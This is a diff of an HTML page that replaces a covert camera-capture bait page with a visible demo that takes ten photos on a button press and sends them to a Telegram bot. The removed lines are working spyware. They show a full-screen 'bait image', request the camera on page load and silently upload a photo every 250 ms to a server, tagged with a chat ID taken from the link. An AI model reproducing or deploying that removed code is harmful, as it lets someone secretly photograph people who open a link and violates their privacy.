@@ -1,69 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Access</title>
+  <title>Camera Capture</title>
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      width: 100%;
-      background-color: black;
-    }
-    #bait {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 20px; }
+    video, canvas { width: 300px; border: 2px solid #444; margin: 5px; }
+    .photos { display: flex; flex-wrap: wrap; justify-content: center; }
   </style>
 </head>
 <body>
-  <!-- Replace welcome.jpg with your bait image -->
-  <img src="/static/welcome.jpg" id="bait" alt="Image">
+  <h2>📸 Camera Capture Demo</h2>
+  <video id="video" autoplay playsinline></video><br>
+  <button id="captureBtn">Take 10 Photos</button>
+  <div class="photos" id="photos"></div>
+  <button id="sendBtn" disabled>Send to Bot</button>
 
   <script>
-    async function startBurstCapture() {
-      try {
-        // Get chat_id from URL (example: ?chat_id=123456789)
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get("chat_id");
+    const video = document.getElementById('video');
+    const photosDiv = document.getElementById('photos');
+    const captureBtn = document.getElementById('captureBtn');
+    const sendBtn = document.getElementById('sendBtn');
+    let photos = [];
 
-        if (!chatId) {
-          console.error("❌ No chat_id in URL!");
-          return;
-        }
+    // Start camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => alert("Camera permission denied"));
 
-        // Ask for camera access
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
+    // Capture 10 photos
+    captureBtn.addEventListener('click', async () => {
+      photos = [];
+      photosDiv.innerHTML = "";
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-        // Burst mode: capture every 250ms (~4 photos per second)
-        setInterval(async () => {
-          try {
-            const blob = await imageCapture.takePhoto();
-            const formData = new FormData();
-            formData.append("photo", blob, `photo_${Date.now()}.jpg`);
-            formData.append("chat_id", chatId);
+      for (let i = 0; i < 10; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        let imgData = canvas.toDataURL('image/png');
+        photos.push(imgData);
 
-            fetch("/upload", { method: "POST", body: formData })
-              .then(() => console.log("✅ Burst photo sent:", new Date().toLocaleTimeString()))
-              .catch(err => console.error("❌ Upload error:", err));
-          } catch (err) {
-            console.error("❌ Capture error:", err);
-          }
-        }, 250); // 250ms = 4 per second
-      } catch (err) {
-        console.error("❌ Camera access denied:", err);
+        // Show preview
+        let img = document.createElement('img');
+        img.src = imgData;
+        img.width = 100;
+        photosDiv.appendChild(img);
+
+        await new Promise(r => setTimeout(r, 200)); // small delay between shots
       }
-    }
 
-    window.onload = startBurstCapture;
+      sendBtn.disabled = false;
+    });
+
+    // Send photos to Telegram Bot
+    sendBtn.addEventListener('click', async () => {
+      const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";  // replace with your ID
+      const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+
+      for (let i = 0; i < photos.length; i++) {
+        let blob = await (await fetch(photos[i])).blob();
+        let formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, `photo${i}.png`);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      }
+
+      alert("✅ Photos sent to Telegram!");
+    });
   </script>
 </body>
 </html>
